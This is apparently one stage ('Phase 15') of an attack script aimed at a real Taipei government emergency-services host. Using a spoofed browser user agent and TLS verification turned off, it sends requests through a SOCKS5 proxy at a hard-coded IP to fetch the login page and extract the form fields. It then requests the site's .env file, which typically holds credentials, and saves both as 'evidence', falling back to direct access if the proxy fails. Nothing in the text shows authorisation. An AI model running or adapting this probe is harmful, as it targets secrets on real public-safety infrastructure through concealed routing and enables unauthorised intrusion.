#!/usr/bin/env python3
"""Phase 15: Retry proxy and get FSM .env + login page. Also try direct access."""
import requests, urllib3, re, json, socks, socket
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

HEADERS = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"}

# Try the proxy - test connectivity first
proxies = {"https": "socks5h://202.160.76.155:11084"}
try:
    r = requests.get("https://fsm.119.gov.taipei/w/fsm119/index", proxies=proxies, headers=HEADERS, verify=False, timeout=20)
    print(f"[Via proxy] fsm.119.gov.taipei/w/fsm119/index: {r.status_code}, len={len(r.text)}")
    t = re.search(r'<title[^>]*>(.*?)</title>', r.text, re.I | re.S)
    print(f"  Title: {t.group(1).strip() if t else 'N/A'}")
    print(f"  Has form: {'<form' in r.text.lower()}")
    # Extract form details
    forms = re.findall(r'<form[^>]*>', r.text, re.I)
    for form in forms[:3]:
        print(f"  Form: {form[:200]}")
    inputs = re.findall(r'<input[^>]*>', r.text, re.I)
    for inp in inputs[:10]:
        print(f"  Input: {inp[:150]}")
    
    # Get .env
    r2 = requests.get("https://fsm.119.gov.taipei/.env", proxies=proxies, headers=HEADERS, verify=False, timeout=20)
    print(f"\n[Via proxy] fsm.119.gov.taipei/.env: {r2.status_code}, len={len(r2.text)}")
    print(f"  Content: {r2.text[:500]}")
    
    # Save files
    with open("tpe119_evidence/fsm_login_page.html", "w") as f:
        f.write(r.text)
    with open("tpe119_evidence/fsm_env_content.txt", "w") as f:
        f.write(r2.text[:2000])
    
except Exception as e:
    print(f"[Via proxy] FAILED: {e}")
    print("Trying direct access (no proxy)...")
    try:
        r = requests.get("https://fsm.119.gov.taipei/w/fsm119/index", headers=HEADERS, verify=False, timeout=15)
        print(f"[Direct] Status: {r.status_code}, len={len(r.text)}")
        t = re.search(r'<title[^>]*>(.*?)</title>', r.text, re.I | re.S)
        print(f"  Title: {t.group(1).strip() if t else 'N/A'}")
    except Exception as e2:
        print(f"[Direct] FAILED: {e2}")
